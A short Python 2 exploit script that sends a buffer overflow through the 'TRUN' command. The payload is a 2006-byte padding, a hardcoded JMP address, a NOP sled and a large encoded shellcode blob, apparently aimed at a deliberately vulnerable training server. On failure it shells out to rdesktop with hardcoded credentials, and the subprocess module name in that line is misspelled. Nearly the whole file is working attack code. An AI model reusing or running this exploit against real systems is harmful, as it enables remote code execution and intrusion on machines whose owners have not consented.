import socket
import sys
import subprocess

ip = sys.argv[1]
port = int(sys.argv[2])

overflow_size = 2006
jmp = "\xAF\x11\x50\x62"
nop_sled = 32

buf =  ""
buf += "\xbe\x9a\x3a\xd4\xb6\xd9\xc1\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x6f\x31\x70\x13\x03\x70\x13\x83\xc0\x9e\xd8"
buf += "\x21\x4a\x76\x95\xca\xb3\x86\xc6\x43\x56\xb7\xd4\x30"
buf += "\x12\xe5\xe8\x33\x76\x05\x82\x16\x63\x9e\xe6\xbe\x84"
buf += "\x17\x4c\x99\xab\xa8\x60\x25\x67\x6a\xe2\xd9\x7a\xbe"
buf += "\xc4\xe0\xb4\xb3\x05\x24\xa8\x3b\x57\xfd\xa6\xe9\x48"
buf += "\x8a\xfb\x31\x68\x5c\x70\x09\x12\xd9\x47\xfd\xa8\xe0"
buf += "\x97\xad\xa7\xab\x0f\xc6\xe0\x0b\x31\x0b\xf3\x70\x78"
buf += "\x20\xc0\x03\x7b\xe0\x18\xeb\x4d\xcc\xf7\xd2\x61\xc1"
buf += "\x06\x12\x45\x39\x7d\x68\xb5\xc4\x86\xab\xc7\x12\x02"
buf += "\x2e\x6f\xd1\xb4\x8a\x91\x36\x22\x58\x9d\xf3\x20\x06"
buf += "\x82\x02\xe4\x3c\xbe\x8f\x0b\x93\x36\xcb\x2f\x37\x12"
buf += "\x88\x4e\x6e\xfe\x7f\x6e\x70\xa6\x20\xca\xfa\x45\x35"
buf += "\x6c\xa1\x01\xa7\x14\x2e\xd2\x5f\xa0\xa7\xbc\xf6\xc7"
buf += "\xde\x15\x60\x94\x69\xb0\x77\xdb\x43\x8d\x88\x74\x3b"
buf += "\xb9\x21\x2d\xab\x7f\x9b\xa8\x8c\x7f\xf6\xa0\xb3\x24"
buf += "\xc9\xff\x65\x8a\x43\x03\xd7\x7d\xf9\x53\x84\x2d\x95"
buf += "\x04\xa3\x51\xa3\x54\x66\x86\x64\xf2\xb8\x8b\x28\x6c"
buf += "\xbb\x19\xac\xe8\xe9\x0f\x7e\xa0\x5f\xe0\x16\xa9\x35"
buf += "\x2e\xdd\xd2\x63\xa7\xe7\x47\x9c\xe3\x8f\x17\xaf\x13"
buf += "\x4f\x91\x30\x79\x4b\xf1\xda\x61\x05\x99\x6f\xd8\x37"
buf += "\xdf\x6f\x31\x76\x1f\xd8\xed\x2f\x88\xb1\x79\xe2\x30"
buf += "\x26\x01\x03\xe9\xd3\x35\x8e\x32\x97\xba\xf4\x4e\x27"
buf += "\xc5\xf4\x5b\xf6\x2c\x64\x9b\xf9\xae\x6c\x30\x06\x51"
buf += "\x93\x66\x89\xcf\x12\x15\x06\x71\x80\xcb\xbd\x09\x2d"
buf += "\x14\xd5\x81\x9c\xd4\x76\x06\xb4\xd6\xe2\xa4\x18\xbd"
buf += "\xf0\xc2\x9a\x16\x9d\xc8\x6c\x42\x12\x12\x45\xe0\x9c"
buf += "\x2c\x03\xbf\xdb\xaf\xe2\x7b\xb7\x22\xb8\xa7\x30\x0c"
buf += "\x80\x1c\x43\x3e\x51\x0b\x2c\xac\xc7\x3a\x4e\x2f\x32"
buf += "\xb9\x4f\xa4\x91\x9a\xca\x85\x9d\x0c\xbf\x05\x09\x61"
buf += "\xb2\x42\x95\x8d\x9c\x19\xbd\xa0\x4b\x30\x66\x44\xa6"
buf += "\xcf\x74\xbe\xa2\x1e\xd7\xd7\xf2\x09\x50\x75\x04\xe0"
buf += "\x34\x7a\xad\x63\xf9\xf1\x3e\xf3\x06\xd0\xab\xfb\x90"
buf += "\x3b\x36\xd6\x6a\x43\x9c\xce\xfa\x44\xe0\xf0\x8a\xdb"
buf += "\x66\x63\x05\x7d\xfd\x55\xbc\x05\x98\xa9\xd6\xf0\x9d"
buf += "\x55\xd9\xcc\x51\x84\x14\x19\xa5\xf6\x60\x4b\xfe\x06"

bad_cmd = "TRUN ." + "A" * overflow_size + jmp + "\x90" * nop_sled + buf

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5)
	s.connect((ip,port))
	data = s.recv(4096)
	print "[*] sending attack with payload %s" % buf
	# print data
	s.send(bad_cmd)
	print data
	s.close()
except:
	print "[*] TANGO DOWN"
	subproces.check_output("rdesktop -u haxor -p password %s" % ip, shell=True)